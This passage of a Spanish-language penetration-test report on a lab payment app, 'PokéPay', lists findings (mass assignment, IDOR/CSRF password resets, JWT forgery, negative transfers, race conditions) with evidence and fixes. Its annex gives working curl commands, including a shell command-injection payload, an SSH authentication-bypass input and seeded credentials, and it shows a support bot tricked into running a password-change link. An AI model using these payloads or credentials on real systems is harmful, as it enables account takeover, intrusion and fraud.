  - Token forjado (`sub=1`, `role=admin`) usado contra `/api/admin/users` → **HTTP 200**, `total: 10`, `role_in_token: "admin"`.
- **Impacto:** Escalada directa a administrador sin tocar la base de datos ni credenciales de usuario; acceso total a datos y a la función de backup (→ F-01).
- **Remediación:**
  - Rotar el secreto por uno aleatorio de ≥256 bits, gestionado fuera del código (KMS/secret manager) y con rotación.
  - Validar `role` contra la base de datos (no confiar en el claim) y añadir revocación/`jti`.
  - Migrar a cookies `HttpOnly`/`SameSite` o reforzar la protección del almacenamiento del token.

---

### F-04 — Mass assignment en el perfil: escalada a admin y saldo arbitrario — CRÍTICA

- **Endpoint:** `PATCH /api/users/me`
- **CWE:** CWE-915 (asignación masiva de atributos)
- **CVSS v3.1 estimado:** 8.8 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Descripción:** El endpoint acepta y persiste campos que no deberían ser editables por el usuario (`role`, `balance_cents`, `is_verified`).
- **Evidencia (usuario recién registrado):**
  ```json
  {"name":"MassTest","role":"admin","is_verified":1,"balance_cents":999999}
  ```
  Respuesta: `role: "admin"`, `balance_cents: 999999`, `is_verified: true`; `GET /api/users/me` → `is_admin: true`; `GET /api/admin/stats` → **HTTP 200**.
- **Impacto:** Escalada de privilegios vertical inmediata y creación de saldo arbitrario; combinado con F-01 lleva a RCE.
- **Remediación:** Lista blanca explícita de campos (`name`, `phone`, `avatar_url`). Nunca aceptar `role`, `balance_cents` ni `is_verified` desde el cliente; validar tipo y rango.

---

### F-05 — Control de acceso roto + CSRF en cambio de contraseña (toma de cuentas) — CRÍTICA

- **Endpoint:** `POST/GET /api/users/change-password`
- **CWE:** CWE-639 (IDOR) + CWE-352 (CSRF) + CWE-620 (cambio sin verificación de contraseña actual)
- **CVSS v3.1 estimado:** 8.8 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Descripción:** El usuario objetivo se toma de `user_id` (parámetro/query), no de la sesión. Se acepta por **GET** (método que no debe mutar estado), sin token CSRF ni comprobación de `Origin/Referer`, y sin exigir la contraseña actual. Un usuario estándar puede fijar la contraseña de cualquier cuenta, incluida la del administrador.
- **Evidencia:**
  - Usuario estándar → `POST /api/users/change-password` con `{"user_id":1,"new_password":"ghost123"}` → `{"ok":true,"user_id":1,"name":"Profesor Oak","status":"password_changed"}`.
  - Login posterior como `admin@pokepay.local` con la nueva contraseña → token `role: admin`.
  - También funciona por **GET** con token: `GET /api/users/change-password?user_id=2&new_password=test123` → 200 (cuenta de Ash modificada durante la prueba).
  - Sin token → 401 (la única barrera es estar autenticado, no ser el propietario).
- **Impacto:** Toma de control de cualquier cuenta (incluida la administrativa) y, por tanto, de toda la plataforma.
- **Remediación:** Derivar el sujeto del token; rechazar `user_id` del cliente; exigir contraseña actual; solo POST con CSRF token y validación de `Origin`; invalidar sesiones tras el cambio.

---

### F-06 — CSRF a través del bot de soporte (toma de la cuenta admin) — CRÍTICA

- **Activo:** `/api/chat` + bot de soporte (Profesor Oak, id 1)
- **CWE:** CWE-352 (CSRF) + diseño inseguro del bot
- **CVSS v3.1 estimado:** 8.8 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
- **Descripción:** El bot “abre” enlaces enviados por el usuario usando su propia identidad privilegiada. Si el enlace apunta a `/api/users/change-password?user_id=1&new_password=...`, el bot ejecuta el cambio de contraseña del administrador.
- **Evidencia:** Mensaje enviado:
  `http://172.17.0.2:3000/api/users/change-password?user_id=1&new_password=chatPwn#2026`
  Respuesta del bot + mensaje de sistema:
  - “He abierto el enlace que me has enviado… y ya no puedo acceder a mi cuenta…”
  - “Contraseña modificada: Profesor Oak (#1).”
  Login posterior con `chatPwn#2026` → **token de administrador**.
- **Impacto:** Compromiso de la cuenta administrativa sin credenciales ni interacción del operador real, partiendo de una cuenta normal.
- **Remediación:** El bot no debe ejecutar acciones de estado a partir de enlaces de usuario; abrir en un navegador aislado sin sesión; lista blanca de dominios/rutas; métodos seguros (POST + CSRF) en cambios sensibles; separar la identidad del bot de la del administrador.

---

### F-07 — IDOR en lectura de cuentas e historial de transacciones — ALTA

- **Endpoints:** `GET /api/accounts/:id`, `GET /api/accounts/:id/transactions`
- **CWE:** CWE-639 (BOLA/IDOR)
- **CVSS v3.1 estimado:** 7.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Evidencia:**
  - `GET /api/accounts/1` → datos del admin: `email: admin@pokepay.local`, `phone: +34 900 000 001`, `balance_cents`, `role: admin`, `is_verified: true`, `created_at`.
  - `GET /api/accounts/2` → datos de Ash Ketchum.
  - `GET /api/accounts/1/transactions` → historial de movimientos de la cuenta indicada.
- **Impacto:** Exposición de PII (nombre, email, teléfono), saldos, roles y actividad financiera de cualquier usuario; base para ingeniería social y ataques dirigidos.
- **Remediación:** Autorización por objeto (propietario o rol con necesidad legítima); minimizar campos; auditar accesos.

---

### F-08 — Transferencias con importe negativo (manipulación de saldo) — ALTA

- **Endpoint:** `POST /api/transfers`
- **CWE:** CWE-1284 / CWE-20 (validación de entrada insuficiente)
- **CVSS v3.1 estimado:** 8.1 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`
- **Descripción:** No se valida que `amount_cents` sea positivo. Con un importe negativo, la comprobación de saldo no salta, el emisor **gana** saldo y el receptor lo **pierde**.
- **Evidencia:**
  - `{"to_account_id":1,"amount_cents":-50000,"concept":"neg"}` → `ok:true`, `amount_cents:-50000`.
  - Saldo del atacante: 100 → **50.099** céntimos; saldo del admin: 500 → **-49.500** céntimos.
- **Impacto:** Fraude económico, saldos negativos, corrupción contable y creación ilimitada de dinero.
- **Remediación:** Rechazar `amount <= 0`, validar tipo/entero/rango, comprobar fondos y límites, usar transacciones atómicas y auditoría.

---

### F-09 — Precio de compra controlado por el cliente — ALTA

- **Endpoint:** `POST /api/marketplace/purchase`
- **CWE:** CWE-602 / CWE-472 (confianza en datos del cliente)
- **CVSS v3.1 estimado:** 7.1 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`
- **Descripción:** El servidor acepta `price_cents` enviado por el cliente en lugar de calcularlo desde el catálogo. Además, el precio del catálogo se devuelve en la respuesta (`catalog_price_cents`), facilitando la comparación.
- **Evidencia:** Compra de Master Ball (catálogo 500.000 céntimos):
  `{"productId":4,"price_cents":1,"quantity":1}` → `charged_cents: 1`, `catalog_price_cents: 500000`.
- **Impacto:** Adquisición de bienes a precio arbitrario (fraude) y registros de compra inconsistentes.
- **Remediación:** Calcular el total exclusivamente en servidor (`product.price_cents * quantity`); ignorar cualquier precio del cliente; validar cantidad entera positiva.

---

### F-10 — Cantidades fraccionarias y cargos sub-céntimo — MEDIA

- **Endpoint:** `POST /api/marketplace/purchase`
- **CWE:** CWE-682 (cálculo incorrecto)
- **CVSS v3.1 estimado:** 4.3 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
- **Descripción:** `quantity` acepta números no enteros y el total se calcula con coma flotante, generando cargos por fracciones de céntimo y saldos no enteros.
- **Evidencia:** `{"productId":4,"price_cents":1,"quantity":0.001}` → `charged_cents: 0.001`, saldo resultante `999998.999`.
- **Impacto:** Inconsistencia contable, posible abuso acumulativo y evasión de controles basados en importes enteros.
- **Remediación:** Exigir `quantity` entero ≥ 1; usar aritmética entera en céntimos; redondeo explícito y validación de rangos.

---

### F-11 — Condición de carrera en el Sorteo Pokémon — MEDIA

- **Endpoint:** `POST /api/promotions/pokemon-draw/claim`
- **CWE:** CWE-362 (TOCTOU / race condition)
- **CVSS v3.1 estimado:** 6.5 — `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N`
- **Descripción:** Se comprueba el número de intentos y, tras un `await` de 350 ms (simulación antifraude), se registra el intento sin bloqueo ni operación atómica.
- **Evidencia:** 12 peticiones concurrentes con un usuario nuevo (máximo 2) →
  `draws: 12`, `over_limit: true`, 12 Pokémon obtenidos (incluidos Mewtwo, Mew, Charizard…).
- **Impacto:** Obtención ilimitada de recompensas/activos, fraude de promociones y ventaja económica.
- **Remediación:** Operación atómica (contador + inserción en una única transacción o lock por usuario); idempotencia; límites por cuenta/IP y monitorización.

---

### F-12 — Secretos en variables de entorno: credenciales root de host de respaldo — ALTA

- **Activo:** Entorno del proceso Node (`/proc/1/environ`)
- **CWE:** CWE-526 / CWE-798 (exposición de secretos)
- **CVSS v3.1 estimado:** 8.2 — `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- **Evidencia (obtenida por F-01):**
  - `BACKUP_SSH_HOST=10.66.6.23`
  - `BACKUP_SSH_USER=root`
  - `BACKUP_SSH_PASSWORD=K4nto_B4ckup_R00t!`
- **Impacto:** Credenciales de **root** para un host de respaldo/pivote. En una intrusión real permitiría movimiento lateral con máximos privilegios fuera del contenedor.
- **Remediación:** Sacar secretos del entorno (secret manager), rotarlos inmediatamente, usar claves SSH con passphrase/agent y mínimo privilegio; no incluir credenciales de otros sistemas en el contenedor.

---

### F-13 — Ficheros sensibles internos accesibles por el usuario de la aplicación — MEDIA

- **Rutas:** `/app/writeup.txt` (28 KB), `/app/data/state.json` (estado completo con hashes scrypt), `/app/package.json`, backups en `/tmp`
- **CWE:** CWE-538 / CWE-732 (permisos/ficheros expuestos)
- **Evidencia:** Lectura directa vía RCE:
  - `/app/writeup.txt` contiene la **solución completa** del laboratorio y credenciales sembradas (admin, ash, misty, brock, jessie, gary, bob).
  - `/app/data/state.json` contiene usuarios, hashes `scrypt`, saldos, productos, transacciones y sorteos.
  - `/tmp/backup-pokepay-*.tar.gz` generado por la app incluye `data`, `public` y `server`.
- **Impacto:** Facilitar el compromiso total tras obtener cualquier ejecución/lectura (defensa en profundidad inexistente).
- **Remediación:** No incluir solucionarios ni credenciales en imágenes de producción; excluir `data/` del backup web o cifrarlo; permisos mínimos; retirar artefactos temporales.

---

## 7. Análisis de escalada a root (objetivo uid 0)

Se dispuso de **tres accesos**: usuario estándar de la app, administrador de la app (→ RCE como `www-data`) y shell SSH como `alice` (uid 1000).

| Vector comprobado | Resultado |
|---|---|
| `sudo` / `doas` | No instalados (`sudo: not found`, sin `/etc/sudoers`, sin `doas`) |
| `su` a root | `/bin/su -> /bin/busybox` **sin SUID**; falla con `su: must be suid to work properly` |
| Binarios SUID | Solo estándar: `passwd`, `chsh`, `gpasswd`, `expiry`, `chage`, `chfn`, `ssh-keysign` (sin vectores evidentes) |
| Capabilities | `CapEff/CapPrm/CapInh = 0`; sin capabilities explotables |
| Cron / tareas root | `/etc/crontabs/root` no legible; sin scripts root escribibles detectados |
| `/etc` y rutas privilegiadas | Sin escrituras útiles para `alice` |
| `/etc/shadow` | `root:shadow 640`, no legible por `alice` ni `www-data` |
| Docker socket / montajes | Sin `/var/run/docker.sock`; sin montajes privilegiados; `seccomp=2` |
| sshd (root) | La vulnerabilidad permite **bypass de autenticación de usuario**, no ejecución como root; `PermitRootLogin no` bloquea root |
| Kernel | `7.1.5+kali-amd64`; no se intentaron exploits de kernel (fuera de alcance/riesgo) |

**Conclusión:** no se alcanzó **uid 0** en el contenedor. Lo obtenido es:
- **Administrador de la aplicación** (rol `admin`) y RCE como `www-data`.
- **Shell de usuario local** como `alice` vía CVE-2026-123158.

El salto a root requeriría un vector adicional (p. ej. una configuración/binario privilegiado vulnerable no presente, un exploit de kernel aplicable o un escape de contenedor) que no se identificó en el entorno auditado.

---

## 8. Credenciales y datos expuestos

**Secretos confirmados:**
- Secreto JWT: `chocolate1` (crackeado con `rockyou.txt`).
- Credenciales root de host de respaldo: `root` / `K4nto_B4ckup_R00t!` en `10.66.6.23`.
- Credenciales sembradas del laboratorio (en `/app/writeup.txt`): `admin@pokepay.local / AdminOak#2024_lab`, `ash@pokepay.local / Pikachu#2024_lab`, `misty@pokepay.local / Starmie#2024_lab`, `brock@pokepay.local / Onix#2024_lab`, `jessie@pokepay.local / Ekans#2024_lab`, `gary@pokepay.local / Eevee#2024_lab`, SSH `bob / BobLabPass-123`.
- Estado completo de usuarios y hashes `scrypt` en `/app/data/state.json`.

**Datos personales/financieros expuestos vía API:** nombre, email, teléfono, saldo, rol, estado de verificación, fecha de alta e historial de transacciones de **cualquier** cuenta (F-07).

---

## 9. Conclusión

PokéPay concentra **fallos críticos de control de acceso** (mass assignment, IDOR/CSRF, confianza en claims JWT) junto con una **inyección de comandos** en una función administrativa y un **bypass de autenticación SSH** en la imagen base. La combinación permitió, en el marco de esta auditoría ética:

- Comprometer la **cuenta administradora** por tres rutas independientes.
- Obtener **ejecución remota de comandos** como `www-data` y extraer **credenciales root de un host de respaldo**.
- Acceder como **`alice`** al sistema operativo sin credenciales reales.
- Manipular saldos, precios y recompensas, y exfiltrar datos personales/financieros de todos los usuarios.

**No se alcanzó uid 0** en el contenedor: el acceso SSH obtenido es de usuario y las vías locales de elevación (sudo/doas, SUID, capabilities, cron, escritura privilegiada, Docker socket) no estaban disponibles. Aun así, el impacto global es **crítico** por el compromiso de la aplicación, la RCE y la exposición de secretos de otros sistemas.

Se recomienda tratar la remediación como **urgente**, asumir la posible exposición de datos y credenciales durante el periodo vulnerable, y ejecutar un **retest** tras aplicar las correcciones.

---

### Anexo A — Comandos de verificación representativos

```bash
# Reconocimiento
sudo nmap -sS -sC -sV -p- 172.17.0.2

# Registro
curl -s -X POST http://172.17.0.2:3000/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"audit","email":"audit@test.local","password":"Password123!"}'

# Mass assignment (F-04)
curl -s -X PATCH http://172.17.0.2:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"role":"admin","is_verified":1,"balance_cents":999999}'

# IDOR cambio de contraseña (F-05)
curl -s -X POST http://172.17.0.2:3000/api/users/change-password \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"user_id":1,"new_password":"hacked123"}'

# RCE (F-01, como admin)
curl -s -X POST http://172.17.0.2:3000/api/admin/backup \
  -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
  -d '{"label":"x; id; whoami; hostname; env; echo END #"}'

# SSH bypass (F-02)
ssh alice@172.17.0.2   # contraseña: 300 x "A" + espacio
```
